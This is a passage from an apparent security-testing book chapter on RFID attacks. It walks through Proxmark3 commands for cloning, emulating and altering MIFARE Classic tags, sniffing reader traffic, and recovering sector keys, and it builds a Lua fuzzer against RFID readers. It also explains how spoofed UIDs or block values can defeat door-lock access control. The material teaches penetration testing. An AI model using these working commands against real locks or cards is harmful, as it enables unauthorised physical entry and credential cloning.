[+] successfully read block  1 of sector  0.          
...         
[+] successfully read block  3 of sector 15.          
[+] time: 35 seconds
[+] Succeeded in dumping all blocks
[+] saved 1024 bytes to binary file hf-mf-B46F6F79-data.bin </code></pre>
<p>This command stores the data in a file named <em>hf-mf-B46F6F79-data.bin</em>. You can transfer files in the <em>.bin</em> format directly to another RFID tag. </p>
<p>Some Proxmark3 firmwares maintained by third-party developers will store the data in two more files with .<em>eml </em>and .<em>json</em> extensions. You could load the .<em>eml</em> file to the Proxmark3 memory for further use, and you could use the .<em>json</em> file with third-party software and other RFID emulation devices, such as the ChameleonMini. You can easily convert this data from one file format to another, either manually or by using a number of automated scripts that we’ll discuss in “Automating RFID Attacks Using the Proxmark3 Scripting Engine” on page 263. </p>
<p>To copy the stored data to a new card, place the card within range of the Proxmark3’s antenna and use Proxmark3’s <code>restore</code><em> </em>parameter:</p>
<pre><code>proxmark3&gt; <b>hf mf restore</b>
[=] Restoring hf-mf-B46F6F79-data.bin  to card          
Writing to block   0: B4 6F 6F 79 CD 08 04 00 01 2A 51 62 0B D9 BB 1D           
[+] isOk:00          
Writing to block   1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
[+] isOk:01          
Writing to block   2: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
…
Writing to block  63: FF FF FF FF FF FF FF 07 80 69 FF FF FF FF FF FF           
[+] isOk:01          
[=] Finish restore</code></pre>
<p>The card doesn’t need to be blank for this command to work, but the <code>restore</code> command uses <em>dumpkeys.bin</em><code/>once<code/>again to access the card. If the card’s current keys are different than the ones stored in the <em>dumpkeys.bin</em> file, the write operation will fail.  </p>
<h3 id="h2-500907c10-0011">Simulating RFID Tags</h3>
<p class="BodyFirst">In the previous examples, we cloned an RFID tag by storing the legitimate tag’s data in files using the <code>dump</code> command and using a new card to restore <span epub:type="pagebreak" title="255" id="Page_255"/>the extracted data. But it’s also possible to simulate an RFID tag using Proxmark3 by extracting the data directly from the device’s memory. </p>
<p>Load the previously stored contents of a MIFARE tag into the Proxmark3 memory using the <code>eload </code>parameter. Specify the name of the .<em>eml</em> file in which the extracted data is stored:</p>
<pre><code>proxmark3&gt; <b>hf mf eload </b><b>hf-mf-B46F6F79-data</b></code></pre>
<p>Note that this command occasionally fails to transfer the data from all stored sectors to the Proxmark3 memory. In that case, you’ll receive an error message. Using the command two or more times should solve this bug and complete the transfer successfully.</p>
<p>To simulate the RFID tag using data from the device’s memory, use the <code>sim</code> parameter:</p>
<pre><code>proxmark3&gt; <b>hf mf sim *1 u 8c61b5b4 </b>
mf sim cardsize: 1K, uid: 8c 61 b5 b4 , numreads:0, flags:3 (0x03)           
#db# 4B UID: 8c61b5b4          
#db# SAK:    08          
#db# ATQA:   00 04  </code></pre>
<p>The <em>*</em> character selects all the tag’s blocks, and the number that follows it specifies the memory size (in this case, <code>1</code> for MIFARE Classic 1KB). The <code>u</code><em/> parameter specifies the impersonated RFID tag’s UID. </p>
<p>Many IoT devices, such as smart door locks, use the tag’s UID to perform access control. These locks rely on a list of tag UIDs associated with specific people allowed to open the door. For example, a lock on an office door might open only when an RFID tag with the UID <code>8c61b5b4</code>—known to belong to a legitimate employee—is in proximity. </p>
<p>You might be able to guess a valid UID by simulating tags with random UID values. This could work if the tags you’re targeting use low entropy UIDs that are subject to collisions. </p>
<h3 id="h2-500907c10-0012">Altering RFID Tags</h3>
<p class="BodyFirst">In certain cases, it’s useful to alter the contents of a tag’s specific block or sector. For example, a more advanced office door lock won’t just check for the UID of the tag in range; it will also check for a specific value, associated with a legitimate employee, in one of the tag’s blocks. As in the example from “Simulating RFID Tags” on page 254, selecting an arbitrary value might allow you to circumvent the access control.</p>
<p>To change a specific block of a MIFARE tag maintained in the Proxmark3’s memory, use the <code>eset</code> parameter, followed by the block number and the content that you want to add to the block, in hex. In this example, we’ll set the value <code>000102030405060708090a0b0c0d0e0f </code>on block number <code>01</code>:</p>
<pre><code>proxmark3&gt; <b>hf mf eset 01 000102030405060708090a0b0c0d0e0f</b></code></pre>
<p><span epub:type="pagebreak" title="256" id="Page_256"/>To verify the result, use the <code>eget</code> command, followed by the block number again:</p>
<pre><code>proxmark3&gt; <b>hf mf eget 01</b>
data[  1]:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f    </code></pre>
<p>Now it’s possible to use the <code>sim</code> command once more to simulate the altered tag. You can also alter the memory contents of the legitimate physical tag using the <code>wrbl</code> parameter, followed by the block number, the type of key to use (<code>A</code> or<em> </em><code>B</code>), the key—which in our case is the default <code>FFFFFFFFFFFF</code>—and the content in hex:</p>
<pre><code>proxmark3&gt; <b>hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f</b>
--block no:1, key type:B, key:ff ff ff ff ff ff           
--data: 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f           
#db# WRITE BLOCK FINISHED          
isOk:01     </code></pre>
<p>Verify that the specific block was written using the <code>rdbl</code> parameter, followed by the block number 01 with a type B key <code>FFFFFFFFFFFF</code>: </p>
<pre><code>proxmark3&gt; <b>hf mf rdbl 01 B FFFFFFFFFFFF</b>
<b>--block no:1, key type:B, key:ff ff ff ff ff ff            </b>
<b>#db# READ BLOCK FINISHED          </b>
isOk:01 data:00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f</code></pre>
<p>The output contains the same contents in hex that you wrote to that block. </p>
<h3 id="h2-500907c10-0013">Attacking MIFARE with an Android App</h3>
<p class="BodyFirst">On Android phones, you can run apps that attack MIFARE cards. One common app for this is the MIFARE Classic Tool, which uses a preloaded list of keys to brute force the key values and read the card data. You can then save the data to emulate the device in the future. </p>
<p>To read a nearby tag, click the <b>READ TAG</b> button in the app’s main menu. A new interface should appear. From here, you can select a list containing the default keys to test and a progress bar, as shown in <a id="figureanchor10-6" href="#figure10-6">Figure 10-6</a>.</p>
<p>Save this data to a new record by clicking the floppy disk icon on the top of the interface. To clone the tag, click the <b>WRITE TAG</b> button on the main menu. In the new interface, select the record by clicking the <b>SELECT DUMP </b>button and write it to a different tag.</p>
<span epub:type="pagebreak" title="257" id="Page_257"/><figure>
<img src="Images/f10006.png" alt="f10006" width="606" height="564"/>
<figcaption><p><a id="figure10-6">Figure 10-6:</a> The MIFARE Classic Tool interface for Android devices</p></figcaption>
</figure>
<p>After a successful read operation, the app lists the data retrieved from all the blocks, as shown in <a id="figureanchor10-7" href="#figure10-7">Figure 10-7</a>. </p>
<figure>
<img src="Images/f10007.png" alt="f10007" width="554" height="516"/>
<figcaption><p><a id="figure10-7">Figure 10-7:</a> Cloning an RFID tag</p></figcaption>
</figure>
<h3 id="h2-500907c10-0014"><span epub:type="pagebreak" title="258" id="Page_258"/>RAW Commands for Nonbranded or Noncommercial RFID Tags</h3>
<p class="BodyFirst">In the previous sections, we used vendor-specific commands to control commercial RFID tags with Proxmark3. But IoT systems sometimes use nonbranded or noncommercial tags. In this case, you can use Proxmark3 to send custom raw commands to the tags. Raw commands are very useful when you’re able to retrieve command structures from a tag’s datasheet and those commands aren’t yet implemented in Proxmark3.</p>
<p>In the following example, instead of using the<em> </em><code>hf mf</code><em> </em>command as we did in previous sections, we’ll use raw commands to read a MIFARE Classic 1KB tag. </p>
<h4 id="h3-500907c10-0006">Identifying the Card and Reading Its Specification</h4>
<p class="BodyFirst">First, use the <code>hf search</code> command to verify that the tag is in range:</p>
<pre><code>proxmark3&gt; <b>hf search</b>     
UID : 80 55 4b 6c           
ATQA : 00 04          
SAK : 08 [2]          
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          
proprietary non iso14443-4 card found, RATS not supported          
No chinese magic backdoor command detected          
Prng detection: WEAK          
Valid ISO14443A Tag Found - Quiting Search</code></pre>
<p>Next, check the card’s specification, which you can find at the vendor’s site (<a href="https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf" class="LinkURL">https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf</a> and <a href="https://www.nxp.com/docs/en/application-note/AN10833.pdf" class="LinkURL">https://www.nxp.com/docs/en/application-note/AN10833.pdf</a>). According to the specification, to establish a connection with the card and perform a memory operation, we must follow the protocol shown in <a id="figureanchor10-8" href="#figure10-8">Figure 10-8</a>.</p>
<p>The protocol requires four commands to establish an authenticated connection with the MIFARE tag. The first command, <em>Request all</em> or <em>REQA</em>, forces the tag to respond with a code that includes the tag’s UID size. In the <em>Anti-collision loop</em> phase, the reader requests the UIDs of all the tags in the operating field, and in the <em>Select card</em> phase, it selects an individual tag for further transactions. The reader then specifies the tag’s memory location for the memory access operation and authenticates using the corresponding key. We’ll describe the authentication process in “Extracting a Sector’s Key from the Captured Traffic” on page 261.</p>
<h4 id="h3-500907c10-0007">Sending Raw Commands</h4>
<p class="BodyFirst">Using raw commands requires you to manually send each specific byte of the command (or part of it), the corresponding command’s data, and, eventually, the CRC bytes for cards that require error detection. For example, Proxmark3’s <code>hf 14a raw</code> command allows you to send ISO14443A commands to an ISO14443A compatible tag. You then provide the raw commands in hex after the <code>-p</code><em> </em>parameter.</p>
<span epub:type="pagebreak" title="259" id="Page_259"/><figure>
<img src="Images/f10008.png" alt="f10008" width="496" height="750"/>
<figcaption><p><a id="figure10-8">Figure 10-8:</a> MIFARE tags authentication protocol</p></figcaption>
</figure>
<p>You’ll need the hex opcodes for the commands you want to use. You can find these in the card’s specification. These opcodes correspond to the authentication protocol steps shown in <a href="#figure10-8">Figure 10-8</a>. </p>
<p>First, use the <code>hf 14a</code><code>raw</code> command with the <code>–p</code> parameter. Then send the <em>Request all  </em>command, which corresponds to the hex opcode <code>26</code>. According to the specification, this command requires 7 bits, so use the <code>-b 7 </code>parameter to define the maximum number of bits you’ll use. The default value is 8 bits.</p>
<pre><code>proxmark3&gt; <b>hf 14a raw -p -b 7 26</b>
received 2 bytes:          
04 00           </code></pre>
<p>The device responds with a success message, named <em>ATQA</em>, with the value <code>0x4</code>. This byte indicates that the UID size is four bytes. The second command is the <em>Anti-collision </em>command<em>,</em> which corresponds to the hex opcode <code>93 20</code>:</p>
<pre><code>proxmark3&gt; <b>hf 14a raw -p 93 20</b>
received 5 bytes:          
80 55 4B 6C F2     </code></pre>
<p>The device responds with the device UID <code>80 55 4b 6c</code>. It also returns a byte generated by performing a XOR operation on all the previous bytes as <span epub:type="pagebreak" title="260" id="Page_260"/>an integrity protection. We now have to send the <code>SELECT Card</code> command, which corresponds to hex opcode <code>93 70</code>, followed by the previous response, which contains the tag’s UID:</p>
<pre><code>proxmark3&gt; <b>hf 14a raw -p -c 93 70 80 55 4B 6C F2</b>
received 3 bytes:          
08 B6 DD     </code></pre>
<p>Finally, you’re ready to authenticate with a type A sector key, which corresponds to hex opcode <code>60</code>, and the default password for sector <code>00</code>:</p>
<pre><code>proxmark3&gt; <b>hf 14a raw -p -c 60 00</b>
received 4 bytes:          
5C 06 32 57</code></pre>
<p>Now you can proceed with the other memory operations listed in the specification, such as reading a block. We leave this as an exercise for you to complete.</p>
<h3 id="h2-500907c10-0015">Eavesdropping on the Tag-to-Reader Communication </h3>
<p class="BodyFirst">Proxmark3 can eavesdrop on transactions between a reader and a tag. This operation is extremely useful if you want to examine the data a tag and an IoT device exchanges. </p>
<p>To start eavesdropping on the communication channel, place the Proxmark3 antenna between the card and the reader, select either a high-frequency or a low-frequency operation, specify the tag implementation, and use the <code>snoop</code> parameter. (Some vendor-specific tags, implementations use the <code>sniff</code> parameter instead.)</p>
<p>In the following example, we attempt to eavesdrop on an ISO14443A-compatible tag, so we select the <code>14a</code> parameter: </p>
<pre><code>$ proxmark3&gt; <b>hf 14a snoop</b>
#db# cancelled by button          
#db# COMMAND FINISHED          
#db# maxDataLen=4, Uart.state=0, Uart.len=0          
#db# traceLen=11848, Uart.output[0]=00000093</code></pre>
<p>We interrupt the capture by pressing the Proxmark3’s button when the communication between the card and the reader ends.</p>
<p>To retrieve the captured packets, specify either a high-frequency or a low-frequency operation, the <code>list </code>parameter, and the tag implementation: </p>
<pre><code>proxmark3&gt; <b>hf list 14a</b>
Recorded Activity (TraceLen = 11848 bytes)          
Start = Start of Start Bit, End = End of last modulation. Src = Source of Transfer          
iso14443a - All times are in carrier periods (1/13.56Mhz)          
iClass    - Timings are not as accurate
…    
0 |992 | Rdr | 52' | | WUPA  
2228 |   4596 | Tag | 04  00  | |   
7040 |   9504 | Rdr | 93  20  | | ANTICOLL  
<span epub:type="pagebreak" title="261" id="Page_261"/>10676 |  16564 | Tag | 80  55  4b  6c  f2  | |   
19200 |  29728 | Rdr | 93  70  80  55  4b  6c  f2  30  df  |  ok | SELECT_UID  
30900 |  34420 | Tag | 08  b6  dd  | |   
36224 |  40928 | Rdr | 60  00  f5  7b  |  ok | AUTH-A(0)  
42548 |  47220 | Tag | 63  17  ec  f0  | |   
56832 |  66208 | Rdr | 5f! 3e! fb  d2  94! 0e! 94  6b  | !crc| ?  
67380 |  72116 | Tag | 0e  2b  b8  3f! | |   
…</code></pre>
<p>The output will also decode the identified operations. The exclamation points near the hex bytes indicate that a bit error occurred during the capture. </p>
<h3 id="h2-500907c10-0016">Extracting a Sector’s Key from the Captured Traffic</h3>
<p class="BodyFirst">Eavesdropping on RFID traffic can reveal sensitive information, particularly when the tags use weak authentication controls or unencrypted communication channels. Because the MIFARE Classic tags use a weak authentication protocol, you can extract a sector’s private key by capturing a single successful authentication between the RFID tag and the RFID reader.</p>
<p>According to the specification, MIFARE Classic tags perform a three-pass authentication control with the RFID reader for each requested sector. First, the RFID tag selects a parameter called <code>nt</code> and sends it to the RFID reader. The RFID reader performs a cryptographic operation using the private key and received parameter. It generates an answer, called <code>ar</code>. Next, it selects a parameter called <code>nr</code> and sends it to the RFID tag along with <code>ar</code>. Then the tag performs a similar cryptographic operation with the parameters and the private key, generating an answer, called <code>at</code>, that it sends back to the RFID tag reader. Because the cryptographic operations that the reader and the tag perform are weak, knowing these parameters allows you to calculate the private key!</p>
<p>Let’s examine the eavesdropping communications captured in the previous section to extract these exchanged parameters:</p>
<pre><code>proxmark3&gt; <b>hf list 14a</b>
Start = Start of Start Bit, End = End of last modulation. Src = Source of Transfer          
iso14443a - All times are in carrier periods (1/13.56Mhz)          
iClass    - Timings are not as accurate          

   Start |End | Src | Data (! denotes parity error, ' denotes short bytes)| CRC | Annotation |  
   ------------|------------|-----|--------------------------------------------------------------   
   0 |992 | Rdr | 52' | | WUPA  
   2228 |   4596 | Tag | 04  00  | |   
   7040 |   9504 | Rdr | 93  20  | | ANTICOLL  
   10676 |  16564 | Tag | <b>80  55  4b  6c</b>  f2  | | <span class="CodeAnnotation">1</span>
   19200 |  29728 | Rdr | 93  70  80  55  4b  6c  f2  30  df  |  ok | SELECT_UID  
   30900 |  34420 | Tag | 08  b6  dd  | |   
   36224 |  40928 | Rdr | 60  00  f5  7b  |  ok | AUTH-A(0)  
   42548 |  47220 | Tag | <b>63  17  ec  f0</b>  | | <span class="CodeAnnotation">2</span>
   56832 |  66208 | Rdr | <b>5f! 3e! fb  d2</b><b>94! 0e! 94  6b</b>  | !crc| ? <span class="CodeAnnotation">3</span>
   67380 |  72116 | Tag | <b>0e  2b  b8  3f!</b> | | <span class="CodeAnnotation">4</span></code></pre>
<p><span epub:type="pagebreak" title="262" id="Page_262"/>We can identify the card’s UID <span class="CodeAnnotation">1</span> as the value that comes before the <code>SELECT_UID</code> command. The <code>nt</code><span class="CodeAnnotation">2</span>, <code>nr</code>, <code>ar</code><span class="CodeAnnotation">3</span>, and <code>at</code><span class="CodeAnnotation">4</span> parameters appear just after the <code>AUTH-A(0)</code> command, always in this order. </p>
<p>Proxmark3’s source code includes a tool named <code>mfkey64</code> that can perform the cryptographic calculation for us. Pass it the card’s UID, followed by the <code>nt</code>, <code>nr</code>, <code>ar</code>, and <code>at</code> parameters:</p>
<pre><code>$ <b>./tools/mfkey/mfkey64 80554b6c 6317ecf0 5f3efbd2 940e946b 0e2bb83f</b>
MIFARE Classic key recovery - based on 64 bits of keystream
Recover key from only one complete authentication!
Recovering key for:
   uid: 80554b6c
    nt: 6317ecf0
  {nr}: 5f3efbd2
  {ar}: 940e946b
  {at}: 0e2bb83f
LFSR successors of the tag challenge:
  nt' : bb2a17bc
  nt'': 70010929
Time spent in lfsr_recovery64(): 0.09 seconds
Keystream used to generate {ar} and {at}:
   ks2: 2f2483d7
   ks3: 7e2ab116
<b>Found Key: [</b><b>FFFFFFFFFFFF</b><b>]</b><b> </b><span class="CodeAnnotation">1</span></code></pre>
<p>If the parameters are correct, the tool calculates the private key <span class="CodeAnnotation">1</span> for the sector.</p>
<h3 id="h2-500907c10-0017">The Legitimate RFID Reader Attack</h3>
<p class="BodyFirst">In this section, we’ll show you how to spoof a legitimate RFID tag and perform a brute-force attack against the RFID reader’s authentication control. This attack is useful in cases where you have prolonged access to the legitimate reader and limited access to the victim’s tag.</p>
<p>As you might have noticed, the legitimate tag will send the<em> </em><code>at</code> response to the legitimate reader only at the end of the three-pass authentication. Adversaries who have physical access to the reader could spoof the RFID tag, generate their own <code>nt</code><em>,</em> and receive the <code>nr </code>and <code>ar</code> from the legitimate reader. Although the authentication session can’t successfully terminate, because the adversaries don’t know the sector’s key, they might be able to perform a brute-force attack for the rest of the parameters and calculate the key.</p>
<p>To perform the legitimate reader attack, use the tag simulation command <code>hf mf sim</code>: </p>
<pre><code>proxmark3&gt; <b>hf mf sim *1 u 19349245 x i</b>
mf sim cardsize: 1K, uid: 19 34 92 45 , numreads:0, flags:19 (0x13)           
Press pm3-button to abort simulation    
#db# Auth attempt {nr}{ar}: c67f5ca8 68529499          
Collected two pairs of AR/NR which can be used to extract keys from reader:
…</code></pre>
<p><span epub:type="pagebreak" title="263" id="Page_263"/>The <em>* </em>character selects all the tag blocks. The number that follows specifies the memory size (in this case, <code>1</code> for MIFARE Classic 1KB). The <code>u</code> parameter lists the impersonated RFID tag’s UID, and the <code>x</code> parameter enables the attack. The <code>i</code><em> </em>parameter allows the user to have an interactive output.</p>
<p>The command’s output will contain the <code>nr </code>and <code>ar</code> values, which we can use to perform the key calculation in the same way as we did in the previous section. Note that even after calculating the sector’s key, we’d have to gain access to the legitimate tag to read its memory.</p>
<h3 id="h2-500907c10-0018">Automating RFID Attacks Using the Proxmark3 Scripting Engine</h3>
<p class="BodyFirst">The Proxmark3 software comes with a preloaded list of automation scripts that you can use to perform simple tasks. To retrieve the full list, use the <code>script list</code> command:</p>
<pre><code>$ proxmark3&gt; <b>script list</b>
brutesim.lua     A script file          
tnp3dump.lua     A script file          
…
dumptoemul.lua   A script file          
mfkeys.lua       A script file          
test_t55x7_fsk.lua A script file</code></pre>
<p>Next, use the <code>script run</code> command, followed by the script’s name, to run one of the scripts. For example, the following command executes <code>mfkeys</code>, which uses the techniques presented earlier in the chapter (see “Cracking the Keys with a Brute-Force Attack” on page 252) to automate the brute-force attack of a MIFARE Classic card:</p>
<pre><code>$ proxmark3&gt; <b>script run mfkeys</b>
--- Executing: mfkeys.lua, args ''
This script implements check keys. 
It utilises a large list of default keys (currently 92 keys).
If you want to add more, just put them inside mf_default_keys.lua. 
Found a NXP MIFARE CLASSIC 1k | Plus 2k tag
Testing block 3, keytype 0, with 85 keys
…
Do you wish to save the keys to dumpfile? [y/n] ?</code></pre>
<p>Another very helpful script is <code>dumptoemul</code>, which transforms a .<em>bin</em> file created from the dump command to a .<em>eml</em> file that you can directly load to the Proxmark3 emulator’s memory: </p>
<pre><code>proxmark3&gt; <b>script run dumptoemul -i dumpdata.bin -o CEA0B6B4.eml</b>
--- Executing: dumptoemul.lua, args '-i dumpdata.bin -o CEA0B6B4.eml'
Wrote an emulator-dump to the file CEA0B6B4.eml
-----Finished</code></pre>
<p>The <code>-i</code> parameter defines the input file, which in our case is <em>dumpdata.bin</em>, and the <code>-o</code><em> </em>parameter specifies the output file.</p>
<p><span epub:type="pagebreak" title="264" id="Page_264"/>These scripts can be very useful when you have physical access to an RFID-enabled IoT device for only a limited amount of time and want to automate a large number of testing operations.</p>
<h3 id="h2-500907c10-0019">RFID Fuzzing Using Custom Scripting</h3>
<p class="BodyFirst">In this section, we’ll show you how to use Proxmark3’s scripting engine to perform a simple mutation-based fuzzing campaign against an RFID reader. Fuzzers iteratively or randomly generate inputs to a target, which can lead to security issues. Instead of trying to locate known defects in an RFID-enabled system, you can use this process to identify new vulnerabilities in the implementation.  </p>
<p>Mutation-based fuzzers generate inputs by modifying an initial value, called the <em>seed,</em> which is usually a normal payload. In our case, this seed can be a valid RFID tag that we’ve successfully cloned. We’ll create a script that automates the process of connecting to an RFID reader as this legitimate tag and then hide invalid, unexpected, or random data in its memory blocks. When the reader tries to process the malformed data, an unexpected code flow might execute, leading to application or device crashes. The errors and exceptions can help you identify severe loopholes in the RFID reader application.</p>
<p>We’ll target an Android device’s embedded RFID reader and the software that receives the RFID tag data. (You can find many RFID reading apps in the Android Play Store to use as potential targets.) We’ll write the fuzzing code using Lua. You can find the full source code in the book’s repository. In addition, you can find more information about Lua in Chapter 5. </p>
<p>To begin, save the following script skeleton in the Proxmark3 <em>client/scripts</em> folder using the name <em>fuzzer.lua.</em>  This script, which has no functionality, will now appear when you use the <code>script list</code> command:</p>
<pre><code>File: fuzzer.lua
author = "Book Authors"
desc = "This is a script for simple fuzzing of NFC/RFID implementations"

function main(args)
end

main()</code></pre>
<p>Next, extend the script so it uses Proxmark3 to spoof a legitimate RFID tag and establish a connection with the RFID reader. We’ll use a tag that we’ve already read, exported to a .<em>bin</em> file using the <code>dump</code> command, and transformed to a .<em>eml</em> file using the <em>dumptoemul </em>script. Let’s assume that this file is named <em>CEA0B6B4.eml</em>. </p>
<p>First, we create a local variable named <code>tag</code> to store the tag data:</p>
<pre><code>local tag = {}</code></pre>
<p><span epub:type="pagebreak" title="265" id="Page_265"/>Then we create the<em> </em><code>load_seed_tag() </code>function<em>,</em> which loads the stored data from the <em>CEA0B6B4.eml</em> file to the Proxmark3 emulator’s memory, as well as to the previously created local variable named <code>tag</code>: </p>
<pre><code>function load_seed_tag()
    print("Loading seed tag...").   
    core.console("hf mf eload CEA0B6B4") <span class="CodeAnnotation">1</span>
    os.execute('sleep 5') 
    local infile = io.open("CEA0B6B4.eml", "r")
    if infile == nil then 
        print(string.format("Could not read file %s",tostring(input)))
    end
    local t = infile:read("*all")
    local i = 0
    for line in string.gmatch(t, "[^\n]+") do 
        if string.byte(line,1) ~= string.byte("+",1) then
           tag[i] = line <span class="CodeAnnotation">2</span>
           i = i + 1
        end
    end
end</code></pre>
<p>To load a .<em>eml</em> file in Proxmark3 memory, we use the <code>eload </code><span class="CodeAnnotation">1</span> parameter. You can use Proxmark3 commands by providing them as arguments in the <code>core.console()</code> function call. The next part of the function manually reads the file, parses the lines, and appends the content to the <code>tag</code><em> </em><span class="CodeAnnotation">2</span> variable. As mentioned earlier, the <code>eload </code>command occasionally fails to transfer the data from all the stored sectors to the Proxmark3 memory, so you might have to use it more than once.</p>
<p>Our simplified fuzzer will mutate the initial <code>tag</code> value, so we need to write a function that creates random changes in the original RFID tag’s memory. We use a local variable named <code>charset</code> to store the available hex characters that we can use to perform these changes: </p>
<pre><code>local charset = {} do 
    for c = 48, 57  do table.insert(charset, string.char(c)) end
    for c = 97, 102  do table.insert(charset, string.char(c)) end
end</code></pre>
<p>To fill the <code>charset</code> variable, we perform an iteration on the ASCII representation of the characters 0 to 9 and a to f. Then we create the function <code>randomize()</code> that uses the characters stored in the previous variable to create mutations on the emulated tag:</p>
<pre><code>function randomize(block_start, block_end)
    local block = math.random(block_start, block_end) <span class="CodeAnnotation">1</span>
    local position = math.random(0,31) <span class="CodeAnnotation">2</span>
    local value = charset[math.random(1,16)] <span class="CodeAnnotation">3</span>

print("Randomizing block " .. block .. " and position " .. position)

    local string_head = tag[block]:sub(0, position)
<span epub:type="pagebreak" title="266" id="Page_266"/>    local string_tail = tag[block]:sub(position+2)
    tag[block] = string_head .. value .. string_tail

    print(tag[block])
    core.console("hf mf eset " .. block .. " " .. tag[block]) <span class="CodeAnnotation">4</span>
    os.execute('sleep 5')
end</code></pre>
<p>More precisely, this function randomly selects a tag’s memory block <span class="CodeAnnotation">1</span> and a position on each selected block <span class="CodeAnnotation">2</span>, and then introduces a new mutation by replacing this character with a random value <span class="CodeAnnotation">3</span> from <code>charset</code>. We then update the Proxmark3 memory using the<code> hf mf eset </code><span class="CodeAnnotation">4</span> command. </p>
<p>Then we create a function named <code>fuzz()</code> that repeatedly uses the <code>randomize()</code> function to create a new mutation on the seed RFID tag data and emulates the tag to the RFID reader: </p>
<pre><code>function fuzz()
 <span class="CodeAnnotation">1</span> core.clearCommandBuffer()
 <span class="CodeAnnotation">2</span> core.console("hf mf dbg 0")
    os.execute('sleep 5')
 <span class="CodeAnnotation">3</span> while not core.ukbhit() do
        randomize(0,63)
     <span class="CodeAnnotation">4</span> core.console("hf mf sim *1 u CEA0B6B4")
    end
    print("Aborted by user")
end</code></pre>
<p>The <code>fuzz()</code> function also uses the <code>core.clearCommandBuffer()</code> API call <span class="CodeAnnotation">1</span> to clear any remaining commands from Proxmark3 commands queue and uses the <code>hf mf dbg</code><em> </em><span class="CodeAnnotation">2</span><em> </em>command to disable the debugging messages. It performs the fuzzing repeatedly, using a <code>while</code> loop, until the user presses the Proxmark3 hardware button. We detect this using the <code>core.ukbhit()</code><span class="CodeAnnotation">3</span> API call. We implement the simulation using the <code>hf mf sim</code><span class="CodeAnnotation">4</span> command.</p>
<p>Then we add the functions to the original script skeleton in <em>fuzzer.lua</em> and change the main function to call the <code>load_seed_tag() </code>and <code>fuzz()</code> functions: </p>
<pre><code>File: fuzzer.lua
author = "Book Authors"
desc = "This is a script for simple fuzzing of NFC/RFID implementations"

    …Previous functions..
function main(args)
      load_seed_tag()
     fuzz()
end
main()</code></pre>
<p>To start the fuzzing campaign, place the Proxmark3 antenna close to the RFID reader, which is usually located at the back of the Android device. <a id="figureanchor10-9" href="#figure10-9">Figure 10-9</a> shows this setup.</p>
<span epub:type="pagebreak" title="267" id="Page_267"/><figure>
<img src="Images/f10009.png" alt="f10009" width="732" height="530"/>
<figcaption><p><a id="figure10-9">Figure 10-9:</a> Fuzzing the RFID reader in an Android device</p></figcaption>
</figure>
<p>Then execute the <code>script run fuzzer</code> command: </p>
<pre><code>proxmark3&gt; <b>script run fuzzer</b>
Loading seed tag...       
...........................................................
Loaded 64 blocks from file: CEA0B6B4.eml          
#db# Debug level: 0          
Randomizing block 6 and byte 19
00000000000000000008000000000000
mf sim cardsize: 1K, uid: ce a0 b6 b4 , numreads:0, flags:2 (0x02)           
Randomizing block 5 and byte 8
636f6dfe600000000000000000000000
mf sim cardsize: 1K, uid: ce a0 b6 b4 , numreads:0, flags:2 (0x02)           
Randomizing block 5 and byte 19
636f6dfe600000000004000000000000
...</code></pre>
<p>The output should contain the exact mutation that occurs in each data exchange with the reader. In each established communication, the reader will attempt to retrieve and parse the mutated tag data. Depending on the mutation, these inputs can affect the reader’s business logic, leading to undefined behavior or even application crashes. In the worst-case scenario, an RFID-enabled door lock hosting an access-control software might crash upon receiving the mutated input, allowing anyone to freely open the door. </p>
<p>We can evaluate the success of our fuzzer through experimentation. We’d measure the number of possibly exploitable bugs identified by crashing inputs. Note that this script is a simplified fuzzer that follows a naive approach: it uses simple random numbers to create the mutations in the <span epub:type="pagebreak" title="268" id="Page_268"/>given inputs. As a result, we don’t expect it to be very efficient at identifying software crashes. Less naive solutions would use improved mutations, map out the protocol to be fuzzed in detail, or even leverage program analysis and instrumentation techniques to interact with a greater amount of the reader’s code. This would require meticulously examining the documentation and constantly improving your fuzzer. For this purpose, try advanced fuzzing tools, such as the American Fuzzy Lop (AFL) or libFuzzer. This task is beyond the scope of this book, and we leave it as an exercise for you to complete.</p>
<h2 id="h1-500907c10-0003">Conclusion</h2>
<p class="BodyFirst">In this chapter, we investigated RFID technology and covered a number of cloning attacks against common low-frequency and high-frequency RFID implementations. We examined how to retrieve a key to access the password-protected memory of the MIFARE Classic cards and then read and alter their memory. Finally, we walked through a technique that allows you to send raw commands to any type of ISO14493-compatible RFID tag based on its specification, and we used the Proxmark3 scripting engine to create a simplified fuzzer for RFID readers.</p>
</section>
</div></body></html>